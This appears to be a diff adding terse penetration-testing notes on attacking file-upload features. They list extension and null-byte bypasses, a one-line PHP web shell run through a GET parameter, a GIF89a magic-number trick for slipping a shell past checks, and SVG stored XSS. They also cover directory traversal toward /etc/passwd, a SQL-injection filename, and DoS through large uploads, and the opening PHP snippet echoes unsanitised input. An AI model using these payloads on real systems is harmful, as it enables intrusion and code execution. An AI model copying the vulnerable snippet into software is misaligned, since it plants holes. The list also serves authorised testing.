@@ -1,0 +1,47 @@
+<?php
+phpinfo();
+header("Content-Type: text/plain");
+echo "Hello: ".$_GET["name"];
+?>
+
+FFMPEG for LFI
+
+pht, phpt, phtml, php3,php4,php5,php6
+
+ shell.php%00.gif
+ shell.php%001.jpg
+ shell.php\x00.jpg
+ shell.jpg.php 
+
+ sleep(10).jpg
+
+Content-Type” parameter as “image/ *
+
+
+Content length Validation:(<?=`$_GET[x]`?>)
+
+
+Magic number--->content-type to image/gif and start content with GIF89a;
+
+DOS Attack by uploading large file
+
+/../../logo.jpg --Directory traversal
+
+Image-magick attack RCE
+
+php-GD
+
+RCE via zip files
+
+cross domain content hijacking using flash files
+
+Bypass techniques----> 
+upload asp file using .cer & .asa extension (IIS — Windows)
+3. Upload .eml file when content-type = text/HTML
+4. Inject null byte shell.php%001.jpg
+5. Check for .svg file upload you can achieve stored XSS using XML payload
+6. put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
+7. Upload large size file for DoS attack test using the image.
+8. (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
+9. If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
+10. upload the file using SQL command ‘sleep(10).jpg you may achieve SQL if image directly saves to DB.
